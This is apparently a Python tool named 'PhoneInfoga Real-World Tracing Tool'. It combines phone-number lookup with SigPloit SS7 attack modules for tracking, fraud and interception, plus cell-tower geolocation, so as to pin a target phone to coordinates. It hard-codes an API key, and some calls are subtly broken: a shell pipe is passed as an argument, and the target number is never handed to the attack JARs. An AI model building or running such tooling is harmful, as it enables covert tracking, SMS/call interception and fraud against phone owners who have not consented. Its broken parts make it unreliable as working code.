import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import argparse
import sys
import requests
import json
import subprocess
import os

# OpenCellID API Key
API_KEY = "pk.2cb73cd1c5d0a53cc5e21095cbcd0045"

# Path to SigPloit's modules
SIGPLOIT_BASE = "SigPloit"
SIGPLOIT_MODULES = {
    "tracking": os.path.join(SIGPLOIT_BASE, "ss7", "attacks", "tracking", "ati", "AnyTimeInterrogation.jar"),
    "fraud": os.path.join(SIGPLOIT_BASE, "ss7", "attacks", "fraud", "simsi", "SendIMSI.jar"),
    "intercept": os.path.join(SIGPLOIT_BASE, "ss7", "attacks", "interception", "ul", "UpdateLocation.jar")
}

def check_environment():
    """
    Verifies if the system is configured for Real-World SS7 Tracing.
    """
    print("\n" + "="*50)
    print("   REAL-WORLD TRACING ENVIRONMENT CHECK   ")
    print("="*50)
    
    # Check Java
    try:
        java_version = subprocess.run(["java", "-version"], capture_output=True, text=True)
        print("[+] Java: Installed")
    except:
        print("[-] Java: NOT FOUND (SigPloit requires Java 1.7+)")

    # Check SCTP support (Linux specific, but good for guide)
    if sys.platform.startswith("linux"):
        try:
            subprocess.run(["lsmod", "|", "grep", "sctp"], capture_output=True, check=True)
            print("[+] SCTP Module: Loaded")
        except:
            print("[-] SCTP Module: NOT LOADED (Run 'sudo modprobe sctp')")
    else:
        print("[!] OS Notice: Windows requires an SCTP stack or Linux VM (Kali recommended).")

    # Check Network Interface
    print("[*] Required Network: 192.168.56.x (VirtualBox Host-Only)")
    print("-" * 50)
    print("\nCONFIGURATION GUIDE:")
    print("1. Set your IP to 192.168.56.101")
    print("2. Set Gateway/Peer to 192.168.56.102")
    print("3. Start a Signaling Gateway (STP) using Restcomm-JSS7.")
    print("4. SigPloit will then be able to fetch the real-world CellID.")
    print("="*50 + "\n")

def run_sigploit_module(module_name, number_str):
    """
    Attempts to run a SigPloit module to fetch active data.
    """
    jar_path = SIGPLOIT_MODULES.get(module_name)
    
    if not jar_path or not os.path.exists(jar_path):
        return f"\n[!] SigPloit {module_name} module not found. Please ensure SigPloit is cloned correctly."
    
    print(f"\n[*] Launching SigPloit {module_name.capitalize()} (Active Signaling)...")
    print(f"[*] REQUIRED CONFIGURATION:")
    print(f"    - Client IP: 192.168.56.101 (Set your network interface to this IP)")
    print(f"    - Peer IP: 192.168.56.102 (SCTP/M3UA Gateway address)")
    print(f"[*] Accessing real-world coordinates for: {number_str}")
    print(f"[*] Waiting for response (timeout 60s)...)")
    
    try:
        # Run the JAR file with a 60-second timeout for real signaling
        process = subprocess.run(["java", "-jar", jar_path], capture_output=True, text=True, timeout=60)
        
        if process.returncode == 0:
            return f"\n[+] SigPloit {module_name.capitalize()} Result:\n{process.stdout}"
        else:
            return f"\n[-] SigPloit Error (Return Code {process.returncode}):\n{process.stderr}\n[!] CONFIG ERROR: Check if your local IP is 192.168.56.101."
            
    except subprocess.TimeoutExpired:
        return "\n[-] SigPloit Timeout: No response from SS7 gateway. \n    [!] Ensure your SCTP/M3UA stack is running at 192.168.56.102."
    except Exception as e:
        return f"\n[-] Failed to execute SigPloit: {str(e)}"

# OSINT Process documentation
PROCESS_DOC = """
================================================================================
                    PHONE OSINT PROCESS (REAL-WORLD TRACING)
================================================================================

1. OSINT Enumeration (Zero-Noise Recon)
   Map the number to identity and carrier.
   - python3 PhoneInfoga.py -n "+1-555-123-4567"

2. Active Signaling (SigPloit Integration)
   To get coordinates, you MUST have an SS7 gateway (e.g., Restcomm) running.
   - Configure local IP: 192.168.56.101
   - Peer Gateway IP: 192.168.56.102
   - Run: python3 PhoneInfoga.py -n <number> --sigploit

3. Coordinate Mapping (OpenCellID)
   Once SigPloit extracts the MCC, MNC, LAC, and CID, the script maps them.

================================================================================
"""

def get_cell_location(mcc, mnc, lac, cid):
    URL = "https://us1.unwiredlabs.com/v2/process.php"
    
    data = {
        "token": API_KEY,
        "cells": [
            {
                "mcc": int(mcc),
                "mnc": int(mnc),
                "lac": int(lac),
                "cid": int(cid)
            }
        ],
        "format": "json"
    }
    
    try:
        response = requests.post(URL, json=data)
        response.raise_for_status()
        location_data = response.json()
        if location_data.get("status") == "ok":
            lat = location_data.get("lat")
            lon = location_data.get("lon")
            accuracy = location_data.get("accuracy")
            return f"Lat: {lat}, Lon: {lon} (Accuracy: {accuracy}m)"
        else:
            return f"OpenCellID Error: {location_data.get('message')}"
    except requests.exceptions.RequestException as e:
        return f"API Request Error: {e}"

def get_phone_info(number_str, cell_info=None):
    try:
        # Parse number
        parsed_number = phonenumbers.parse(number_str)
        
        if not phonenumbers.is_valid_number(parsed_number):
            return f"[-] Error: {number_str} is not a valid phone number."

        formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        carrier_name = carrier.name_for_number(parsed_number, "en")
        number_type_id = phonenumbers.number_type(parsed_number)
        number_type = "Mobile" if number_type_id == phonenumbers.PhoneNumberType.MOBILE else "Fixed-line/VoIP"
        location = geocoder.description_for_number(parsed_number, "en")
        
        # Real-world location mapping
        active_coords = "N/A"
        if cell_info and all(cell_info.values()):
            print(f"[*] Tracing exact coordinates for CellID {cell_info['cid']}...")
            active_coords = get_cell_location(cell_info["mcc"], cell_info["mnc"], cell_info["lac"], cell_info["cid"])
        else:
            active_coords = "Not Available (Waiting for SigPloit active cell tower data...)"

        output = []
        output.append("-" * 50)
        output.append(f"Number: {formatted_number}")
        output.append(f"Carrier: {carrier_name if carrier_name else 'Unknown'}")
        output.append(f"Type: {number_type}")
        output.append("-" * 50)
        output.append(f"REAL-WORLD LOCATION DATA:")
        output.append(f"Approx Area: {location if location else 'Unknown'}")
        output.append(f"Exact Coordinates: {active_coords}")
        output.append("-" * 50)
        
        clean_num = formatted_number.replace(' ', '').replace('-', '')
        output.append(f"Linked: [Breaches: https://haveibeenpwned.com/api/v3/breachedaccount/{clean_num}]")
        
        return "\n".join(output)

    except Exception as e:
        return f"[-] Error: {str(e)}"

def main():
    parser = argparse.ArgumentParser(description="PhoneInfoga Real-World Tracing Tool")
    parser.add_argument("-n", "--number", help="Phone number to scan")
    parser.add_argument("-p", "--process", action="store_true", help="Display the OSINT process documentation")
    parser.add_argument("-c", "--check", action="store_true", help="Check tracing environment configuration")
    parser.add_argument("--mcc", help="Mobile Country Code")
    parser.add_argument("--mnc", help="Mobile Network Code")
    parser.add_argument("--lac", help="Location Area Code")
    parser.add_argument("--cid", help="Cell ID")
    parser.add_argument("--sigploit", action="store_true", help="Trigger active Tracking scan")
    parser.add_argument("--fraud", action="store_true", help="Trigger active Fraud scan")
    parser.add_argument("--intercept", action="store_true", help="Trigger active Interception scan")
    
    args = parser.parse_args()
    
    if args.process:
        print(PROCESS_DOC)
        return

    if args.check:
        check_environment()
        return

    # Trigger real SigPloit modules
    number = args.number if args.number else ""
    if args.sigploit:
        print(run_sigploit_module("tracking", number))
    elif args.fraud:
        print(run_sigploit_module("fraud", number))
    elif args.intercept:
        print(run_sigploit_module("intercept", number))

    cell_info = {
        "mcc": args.mcc,
        "mnc": args.mnc,
        "lac": args.lac,
        "cid": args.cid
    }

    if not args.number and not all(cell_info.values()) and not args.sigploit and not args.fraud and not args.intercept:
        print("[!] No number or cell info provided.")
        print("Usage: PhoneInfoga.py -n <number> OR provide cell details OR --check.")
        sys.exit(1)

    print("\n" + "="*40)
    print("   Phone OSINT - Real-World Report   ")
    print("="*40 + "\n")
    
    if args.number:
        result = get_phone_info(args.number, cell_info if all(cell_info.values()) else None)
        print(result)
    elif all(cell_info.values()):
        coords = get_cell_location(cell_info["mcc"], cell_info["mnc"], cell_info["lac"], cell_info["cid"])
        print(f"Coordinates: {coords}")

if __name__ == "__main__":
    main()
